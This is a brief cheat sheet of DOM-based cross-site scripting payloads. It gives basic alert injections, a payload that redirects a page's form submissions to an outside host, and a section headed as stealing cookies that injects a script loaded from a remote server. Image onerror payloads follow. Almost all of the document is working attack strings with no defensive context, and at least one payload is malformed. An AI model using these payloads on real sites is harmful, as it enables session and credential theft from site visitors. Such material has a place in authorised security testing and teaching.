XSS DOM: 

DOM runs on the client side,the payloads are process on the browser and not on the server side 

__Basic Payloads:__

	"><img=src="aa" onerror="alert(document.domain)">


	"><svg/onload="alert(document.domain)">



__Complex Payload using POST method__

	"><svg/onload="document.forms[1].action='//sitecom.site/text.php'">



__PART2: Complex JS payload to steal Cookies:__


	- host JS file on the server. 

	- The file has an alert("XSS"); function

	- Craft a payload to connect to it :

		var s= document.createElement('SCRIPT');
		s.src= '//text.site/alert.php';

		document.body.appendChild(s);
		
	
	- Url:  "><svg/onload="var s= document.createElement('SCRIPT');s.src='//text.site/alert.php';document.body.appendChild(s);"

	

__Image Payload__ :

	- URL>>number.php?name=noImage.jpg' onerror=alert("xss");>
	
	- URL >> https://xss-doc.appspot.com/demo/3#imge.jpg' onerror=alert("xss");>

	

